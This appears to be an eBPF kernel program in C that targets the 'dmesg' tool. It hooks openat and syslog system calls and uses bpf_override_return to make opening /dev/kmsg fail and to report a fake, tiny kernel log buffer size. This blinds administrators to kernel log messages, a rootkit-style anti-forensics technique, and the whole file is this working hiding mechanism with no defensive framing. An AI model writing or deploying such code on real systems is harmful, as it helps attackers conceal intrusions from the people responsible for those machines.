// +build ignore

#include "common.h"
#include "bpf_helpers.h"
//#include "vmlinux.h"
char __license[] SEC("license") = "Dual MIT/GPL";


#define MISS 0xdeadbeef
#define HIT  0xffffffff

#define	ENOENT		 2	/* No such file or directory */

#define OPENAT_KEY 0
#define SYSLOG_KEY 1

#define SYSLOG_ACTION_SIZE_BUFFER 10
#define SYSLOG_ACTION_READ_ALL 3

#define DEBUG 1

/* For global int/long... */
struct bpf_map_def SEC("maps") raw_tracepoint_map = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u64),
    .max_entries = 10,
};

/* For global string */
struct bpf_map_def SEC("maps") raw_tracepoint_map_2 = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = 0x40,
    .max_entries = 10,
};
   
// int cron_pid=0;
/* ****************************** Deceleration Begin ****************************** */
/* Another Helpers */
static __inline int memcmp(const void* s1, const void* s2, u64 cnt);
static __inline void *memcpy(void* dest, const void* src, u64 count);
static __inline int memcmp(const void* s1, const void* s2, u64 cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}
static __inline void *memcpy(void* dest, const void* src, u64 count)
{


       char* pdest =(char*) dest;

       const char* psrc =(const char*) src;

       if (psrc > pdest || pdest >= psrc + count)

       {

              while (count--)

              *pdest++ = *psrc++;

       }

       else

       {

               while (count--)

               {

                     *(pdest + count) = *(psrc + count);

              }

       }

return dest;

}


static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx){
  return 0;
}




#define TARGET_NAME "dmesg"
#define TASK_COMM_LEN 0x10
static __inline int check_target(){
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    char target_name[] = TARGET_NAME;
    if(memcmp(comm,target_name,sizeof(target_name))){
      return 0;
    }
    return 111;
}



SEC("kprobe/__x64_sys_openat")
int kprobe_sys_openat(struct pt_regs *ctx)
{
    if(!check_target()){return 0;};

    char *pathname = NULL;
    bpf_probe_read(&pathname,sizeof(pathname),&ctx->si);
    char fmt[] = "%s\n";
    //bpf_trace_printk(fmt,sizeof(fmt),pathname);
    return 0;
}

SEC("kretprobe/__x64_sys_openat")
int kretprobe_sys_openat(struct pt_regs *ctx)
{
    if(!check_target()){return 0;};

    /* read and check flag */
    u32 key = OPENAT_KEY; u64 flag = MISS; void *valp = bpf_map_lookup_elem(&raw_tracepoint_map,&key);if(!valp){return 0;} bpf_probe_read(&flag,sizeof(flag),valp);
    
    /* if hit */
    if(flag == HIT){
      bpf_override_return(ctx, -1); // #define	ENOENT		 2	/* No such file or directory */ ? 

      /* clean the flag */
      flag = MISS;
      bpf_map_update_elem(&raw_tracepoint_map, &key , &flag , BPF_ANY);
    }
    return 0;
}

SEC("kprobe/__x64_sys_syslog")
int kprobe_sys_syslog(struct pt_regs *ctx)
{
    if(!check_target()){return 0;};
    return 0;
}

SEC("kretprobe/__x64_sys_syslog")
int kretprobe_sys_syslog(struct pt_regs *ctx)
{
    if(!check_target()){return 0;};

    /* read and check flag */
    u32 key = SYSLOG_KEY; u64 flag = MISS; void *valp = bpf_map_lookup_elem(&raw_tracepoint_map,&key);if(!valp){return 0;} bpf_probe_read(&flag,sizeof(flag),valp);
   

    /* if hit */
    u64 fake_length = 0x10;
    if(flag == HIT){
      bpf_override_return(ctx, fake_length); // #define	ENOENT		 2	/* No such file or directory */ ? 

      /* clean the flag */
      flag = MISS;
      bpf_map_update_elem(&raw_tracepoint_map, &key , &flag , BPF_ANY);
    }
    return 0;
}


#define KMSG "/dev/kmsg"
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx){
  
  struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
  char *pathname = NULL;
  char buf[0x40];

  /* filter */
  bpf_probe_read(&pathname, sizeof(char *), &regs->si);
  bpf_probe_read_str(buf, sizeof(buf), pathname);
  if(memcmp(buf,KMSG,sizeof(KMSG))){return 0;}

  #ifdef DEBUG
  char fmt[]="%s\n";
  bpf_trace_printk(fmt,sizeof(fmt),buf);
  #endif

  /* report to openat kretprobe */
  u32 key = OPENAT_KEY;
  u64 flag = HIT;
  bpf_map_update_elem(&raw_tracepoint_map, &key , &flag , BPF_ANY);

  return 0;

}

static __inline int handler_enter_syslog(struct bpf_raw_tracepoint_args *ctx){
  struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
  int priority = 0;
  char buf[0x40];

  bpf_probe_read(&priority,sizeof(priority),&regs->di);

  char fmt[] = "enter sys_log hit\n";
  if(priority == SYSLOG_ACTION_SIZE_BUFFER){
    #ifdef DEBUG
    bpf_trace_printk(fmt,sizeof(fmt));
    #endif

    /* report to openat kretprobe */
    u32 key = SYSLOG_KEY;
    u64 flag = HIT;
    bpf_map_update_elem(&raw_tracepoint_map, &key , &flag , BPF_ANY);
  }
  return 0;
}
SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    int a=0;

    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
  
    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
        return 0;
    }

    switch (syscall_id)
    {
        case 103:
            handler_enter_syslog(ctx);
            break;
        case 257:
            handle_enter_openat(ctx);
            break;
        default:
            return 0;
    }
  return 0;
}


SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  return 0;
}

